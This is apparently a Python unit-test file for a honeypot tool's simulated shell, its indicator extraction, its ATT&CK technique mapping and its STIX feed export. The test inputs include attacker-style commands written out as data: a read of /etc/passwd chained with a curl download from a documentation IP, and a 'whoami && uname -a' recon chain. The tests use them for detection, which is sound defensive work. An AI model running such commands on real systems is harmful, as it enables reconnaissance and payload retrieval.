import json
import tempfile
import unittest
from pathlib import Path

from adn.core import EventStore, SimulatedShell, export_stix, extract_indicators, map_techniques


class SimulatedShellTests(unittest.TestCase):
    def setUp(self) -> None:
        self.shell = SimulatedShell()

    def test_simulates_synthetic_filesystem_and_navigation(self) -> None:
        self.assertIn("etc", self.shell.respond("ls /").text)
        self.assertEqual(self.shell.respond("cd /etc").text, "")
        self.assertEqual(self.shell.respond("pwd").text, "/etc")
        self.assertEqual(self.shell.respond("cat hostname").text, "decoy-node-01")

    def test_does_not_execute_unknown_commands(self) -> None:
        response = self.shell.respond("echo hello")
        self.assertEqual(response.text, "echo: command not found")

    def test_simulates_python_unittest_without_executing_code(self) -> None:
        response = self.shell.respond("python -m unittest discover -v")
        self.assertIn("SIMULATION ONLY", response.text)
        self.assertIn("no Python code or tests were executed", response.text)

    def test_python_code_is_not_executed(self) -> None:
        response = self.shell.respond("python -c 'print(1)'")
        self.assertIn("does not execute Python code", response.text)

    def test_detects_indicators_and_attack_techniques(self) -> None:
        text = "cat /etc/passwd; curl http://203.0.113.8/file"
        response = self.shell.respond(text)
        self.assertEqual(response.techniques, ("T1087.001", "T1105"))
        self.assertEqual([(i.kind, i.value) for i in response.indicators], [("ipv4-addr", "203.0.113.8")])

    def test_rejects_oversized_input(self) -> None:
        response = self.shell.respond("x" * 4097)
        self.assertIn("Input too long", response.text)


class ThreatFeedTests(unittest.TestCase):
    def test_extract_indicators_filters_invalid_addresses(self) -> None:
        indicators = extract_indicators("203.0.113.5 999.1.1.1 " + "a" * 64)
        self.assertEqual({(item.kind, item.value) for item in indicators}, {
            ("ipv4-addr", "203.0.113.5"),
            ("sha256", "a" * 64),
        })

    def test_persists_events_and_exports_stix_bundle(self) -> None:
        with tempfile.TemporaryDirectory() as temp_dir:
            database = Path(temp_dir) / "events.sqlite3"
            output = Path(temp_dir) / "feed.json"
            store = EventStore(database)
            response = SimulatedShell().respond("curl http://203.0.113.9/")
            store.record("curl http://203.0.113.9/", "198.51.100.2", response.techniques, response.indicators)
            export_stix(store, output)
            store.close()

            bundle = json.loads(output.read_text(encoding="utf-8"))
            self.assertEqual(bundle["type"], "bundle")
            self.assertEqual(len(bundle["objects"]), 2)
            patterns = {item["pattern"] for item in bundle["objects"]}
            self.assertEqual(patterns, {
                "[ipv4-addr:value = '198.51.100.2']",
                "[ipv4-addr:value = '203.0.113.9']",
            })

    def test_maps_behavior_deterministically(self) -> None:
        self.assertEqual(map_techniques("whoami && uname -a"), ("T1033", "T1082"))


if __name__ == "__main__":
    unittest.main()
